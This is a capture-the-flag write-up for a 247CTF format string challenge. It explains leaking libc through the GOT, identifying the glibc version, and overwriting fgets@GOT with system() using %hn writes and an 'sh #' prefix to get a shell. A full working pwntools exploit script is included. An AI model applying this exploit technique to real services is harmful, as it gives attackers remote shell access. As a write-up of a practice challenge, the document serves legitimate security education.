# Confused Environment Write

- **Category:** PWN / Binary Exploitation
- **Platform:** 247CTF
- **Remote:** `tcp://e1cd4d531439c655.247ctf.com:50247`
- **Description:** "Can you abuse our confused environment service to obtain a write primitive?"
- **Flag:** `247CTF{XXXXXXXXXXXXXXXXXXXX}`

## Binary Analysis

No binary provided - all analysis done remotely through the format string vulnerability.

- **Architecture:** 32-bit (i386), dynamically linked
- **Protections:** Stack canary (`__stack_chk_fail` in GOT), ASLR enabled
- **Input:** `fgets(buf, 64, stdin)` - 63-byte buffer limit
- **Vulnerability:** Format string - user input is passed directly to `__printf_chk(1, buf)`

### Program Behavior

```
What's your name again?
> <user_input>
Oh, that's right! Welcome back <format_string_output>!
Argh, I can't see who you are!
What's your name again?
> ...
```

The program loops indefinitely, reading input with `fgets()` and printing it via `__printf_chk()` without sanitization.

### GOT Layout (via libc leak + identification)

| GOT Address | Function | Libc Offset |
|---|---|---|
| `0x804a00c` | `setbuf` | `0x6df10` |
| `0x804a010` | `printf` | `0x50b60` |
| `0x804a014` | internal/ld | `0x156060` |
| `0x804a018` | **`fgets`** | `0x65810` |
| `0x804a01c` | `__stack_chk_fail` | unresolved |
| `0x804a020` | `puts` | `0x67360` |
| `0x804a024` | `getenv` | `0x2f560` |

**Libc version:** `libc6-i386_2.27-3ubuntu1_amd64` (Ubuntu 18.04, glibc 2.27)

## Vulnerability

The format string vulnerability gives us:
- **Arbitrary read**: `%N$s` and `%N$x` to read stack values and dereference pointers
- **Arbitrary write**: `%N$hn` to write 2-byte values to arbitrary addresses

## Critical Discovery

The function at GOT `0x804a010` was initially assumed to be `puts` (offset `0x67b60`), but was actually **`printf`** (offset `0x50b60`). This caused a **0x17000 byte error** in the libc base calculation, making all previous GOT overwrite attempts write the wrong `system()` address.

The libc version was identified by cross-referencing ALL GOT entries against known glibc symbol offsets using [libc.rip](https://libc.rip/).

## Exploitation

### Strategy: Overwrite `fgets@GOT` → `system()`

1. **Leak libc**: Read `printf@GOT` (0x804a010) via `%11$s`, subtract `0x50b60` for libc base
2. **Calculate system()**: `libc_base + 0x3cd10`
3. **Build payload**: `"sh #" + p32(FGETS_GOT) + p32(FGETS_GOT+2) + %hn_format_specs`
4. **Send payload**: Format string overwrites `fgets@GOT` → `system` using two `%hn` writes
5. **Program loops**: Next call to `fgets(buf, 64, stdin)` becomes `system(buf)`
6. **Shell**: `system("sh #\x18\xa0\x04\x08...")` → `/bin/sh -c "sh #..."` → `sh` runs, `#` comments out binary garbage

### Why "sh #" Works

- `system()` calls `/bin/sh -c <command_string>`
- The buffer still contains our format string payload from the previous iteration
- `"sh #"` at the start means: run `sh`, and `#` begins a shell comment
- All the binary address bytes and format specifiers after `#` are ignored
- The inner `sh` reads commands from stdin (the socket), giving us an interactive shell

### Payload Structure

```
[sh #]          4 bytes - shell command (offset 11)
[fgets_got]     4 bytes - low write target (offset 12)
[fgets_got+2]   4 bytes - high write target (offset 13)
[%Nc%12$hn]     variable - write system_lo to fgets_got
[%Mc%13$hn]     variable - write system_hi to fgets_got+2
```

Total: ~37-38 bytes (well within the 63-byte limit)

## Exploit Code

```python
#!/usr/bin/env python3
from pwn import *
import time
import re

context.log_level = 'info'

HOST = 'e1cd4d531439c655.247ctf.com'
PORT = 50247

# CORRECTED offsets
PRINTF_GOT    = 0x804a010
PRINTF_OFFSET = 0x50b60
SYSTEM_OFFSET = 0x3cd10
FGETS_GOT     = 0x804a018

r = remote(HOST, PORT, timeout=15)
time.sleep(0.5)
try:
    r.recvuntil(b"again?\n", timeout=4)
except:
    r.recv(4096, timeout=1)

def sync():
    try:
        return r.recvuntil(b"again?\n", timeout=4)
    except:
        data = b''
        while True:
            try:
                chunk = r.recv(4096, timeout=1)
                if chunk: data += chunk
                else: break
            except: break
        return data

# Step 1: Leak libc via printf@GOT
log.info("Leaking libc via printf@GOT...")
r.sendline(p32(PRINTF_GOT) + b'XXXX%11$s')
resp = sync()
idx = resp.find(b'XXXX')
printf_addr = u32(resp[idx+4:idx+8])
libc = printf_addr - PRINTF_OFFSET
system_addr = libc + SYSTEM_OFFSET
log.info(f"printf@libc = {hex(printf_addr)}")
log.info(f"libc base   = {hex(libc)}")
log.info(f"system      = {hex(system_addr)}")

# Step 2: Build payload to overwrite fgets@GOT → system
# Format: "sh #" + p32(FGETS_GOT) + p32(FGETS_GOT+2) + %hn writes
prefix = b'sh #'
addr_lo = p32(FGETS_GOT)
addr_hi = p32(FGETS_GOT + 2)
initial = 12  # 4 + 4 + 4 bytes

sys_lo = system_addr & 0xffff
sys_hi = (system_addr >> 16) & 0xffff

if sys_lo <= sys_hi:
    pad1 = (sys_lo - initial) % 0x10000
    pad2 = (sys_hi - sys_lo) % 0x10000
    fmt = b''
    if pad1 > 0: fmt += f'%{pad1}c'.encode()
    fmt += b'%12$hn'
    if pad2 > 0: fmt += f'%{pad2}c'.encode()
    fmt += b'%13$hn'
else:
    pad1 = (sys_hi - initial) % 0x10000
    pad2 = (sys_lo - sys_hi) % 0x10000
    fmt = b''
    if pad1 > 0: fmt += f'%{pad1}c'.encode()
    fmt += b'%13$hn'
    if pad2 > 0: fmt += f'%{pad2}c'.encode()
    fmt += b'%12$hn'

payload = prefix + addr_lo + addr_hi + fmt
r.sendline(payload)

# Step 3: Drain output, then interact with shell
time.sleep(1)
all_output = b''
while True:
    try:
        chunk = r.recv(65536, timeout=5)
        if chunk: all_output += chunk
        else: break
    except: break

# Step 4: Shell interaction
r.sendline(b'cat flag* /flag* 2>/dev/null')
time.sleep(1)
out = r.recvrepeat(timeout=3)
if b'247CTF' in out:
    match = re.search(rb'247CTF\{[^}]+\}', out)
    if match:
        log.success(f"FLAG: {match.group(0).decode()}")

r.interactive()
```

## Key Takeaways

1. **Verify libc function identification**: The `printf` vs `puts` confusion wasted significant time. Always cross-reference multiple GOT entries to confirm the libc version.
2. **GOT overwrite on input functions**: Overwriting `fgets@GOT` → `system` is powerful because the buffer argument already contains attacker-controlled data from the previous iteration.
3. **Comment trick**: Using `"sh #"` as a prefix allows executing a clean shell command while the rest of the buffer (binary addresses, format specs) is treated as a comment.
4. **Remote-only exploitation**: This entire challenge was solved without access to the binary, using only format string reads to map the GOT and identify the libc version.

## Files

- `solve.py` - Working exploit
- `flag.txt` - Captured flag (censored)
- `WRITEUP.md` - This writeup
- `identify_got.py` - GOT entry scanner
- `scan_stack_rop.py` - Stack layout scanner
- `scan_binary.py` - Binary memory scanner
